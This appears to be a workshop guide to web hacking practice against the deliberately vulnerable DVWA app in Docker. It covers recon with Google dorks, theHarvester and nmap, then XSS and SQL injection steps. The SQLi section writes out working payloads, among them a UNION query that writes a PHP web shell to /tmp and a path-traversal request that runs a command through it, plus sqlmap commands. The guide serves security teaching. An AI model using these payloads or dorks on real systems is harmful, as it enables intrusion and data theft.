# Setup

This was done on a Ubuntu 16.04 server.

## Install Docker

```
$ sudo apt-get update && apt-get install docker.io
$ sudo systemctl start docker
```

## Setup Damn Vulnerable Web Application (DVWA)

Pull the image from DockerHub:
```
$ sudo docker pull citizenstig/dvwa
```

Fire up the container:
```
$ sudo docker run -d -p 80:80 citizenstig/dvwa:latest
```

1. DVWA is now available at http://[host-ip]:80 - e.g.`localhost:80`
2. Follow the instructions to setup the MySQL database within the browser
3. Refresh and login, default username is `admin` and the default password is `password`

# Recon
## google hacking
Popular search operations
`site`, `filetype`, `inurl`, `intitle`

Find hardware with known vulnerabilities
`intitle:"SpeedStream Router Management Interface"`

Web accessible, Open Cisco Routers
`inurl:"level/15/exec/-/show"`

## TheHarvester
Install instructions: https://github.com/laramies/theHarvester

Example command for assessing google
`theharvester -d telenordigital.com -l 500 -b all > telenor-digital.txt`


## nmap
`sudo nmap 127.0.0.1 -sV -sC -O`

```
jogr@Jonnathans-MacBook-Pro: recon_enum (master)*$ sudo nmap 127.0.0.1 -sV -sC -O

Starting Nmap 7.12 ( https://nmap.org ) at 2018-02-21 16:31 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-git:
|   127.0.0.1:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/fermayo/hello-world-lamp.git
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-title: Damn Vulnerable Web App (DVWA) - Login
|_Requested resource was login.php
631/tcp open  ipp     CUPS 2.2
| http-methods:
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Home - CUPS 2.2.5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.12%E=4%D=2/21%OT=80%CT=1%CU=32715%PV=N%DS=0%DC=L%G=Y%TM=5A8D910
OS:0%P=x86_64-apple-darwin15.4.0)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=RD%II=RI%
OS:TS=A)OPS(O1=M3FD8NW5NNT11SLL%O2=M3FD8NW5NNT11SLL%O3=M3FD8NW5NNT11%O4=M3F
OS:D8NW5NNT11SLL%O5=M3FD8NW5NNT11SLL%O6=M3FD8NNT11SLL)WIN(W1=FFFF%W2=FFFF%W
OS:3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M3FD8NW5SLL%CC
OS:=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=40%W=0%S=
OS:Z%A=S%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=Z%
OS:RUCK=0%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.55 seconds
```

# Finding vulnerabilities

## Cross Site Scripting (XSS)

1. Go to http://[host-ip]/security.php and set security level to low.
2. Go to http://[host-ip]/vulnerabilities/xss_r/. Explore the functionality.
3. Reflect on the source code by clicking "View Source" in the bottom right.
4. Play around with some input, does the application reflect `<`, `'`, `"`?
5. Can you put actual HTML tags in there, like `<pre>`, `<a>`?
6. Attempt to use the classic `<script>alert(1)</script>` to check for XSS.
7. Show the same with the persistant/stored XSS at http://[host-ip]/vulnerabilities/xss_s/

## SQL Injection (SQLi)

1. Go to http://[host-ip]/security.php and set security level to low.
2. Go to http://[host-ip]/vulnerabilities/sqli/ and explore the functionality
3. View the source by clicking "View Source" in the bottom right.
4. Input a single quote `'` into the input field.
	Makes query: `"SELECT first_name, last_name FROM users WHERE user_id = '''"; 
5. Input `1' OR 1=1;#` into the input field. 
	Makes query: `"SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1;#'"; 
6. Demonstrate that arbitrary information can be received:
	`1' union select all 1,@@version;#`
	`1' union select all 1,table_name FROM information_schema.tables;#`
7. Show that files can be written too:
	`1' union select all 1,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/tmp/backdoor.php'`
8. Take advantage of it with path traversal vulnerability:
	http://[host-ip]/vulnerabilities/fi/?page=../../../../../tmp/backdoor.php&cmd=id
9. Run `sqlmap -u "http://[host-ip]/vulnerabilities/sqli/?id=123&Submit=Submit#"`.
10. Fetch cookie values from CookieManager+
11. Run `sqlmap -u "http://[host-ip]/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=[SESSION FROM COOKIES]"`
12. Run `sqlmap -u "http://[host-ip]/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=[SESSION FROM COOKIES]" --tables`

# Exploitation

## BeEf Command and Control using XSS

## Reverse shell using SQLi

# Resources

## Vulnerable applications
1. Damn Vulnerable Web Application: http://www.dvwa.co.uk/
3. WebGoat: https://github.com/WebGoat/WebGoat
2. Mutillidae 2: https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project
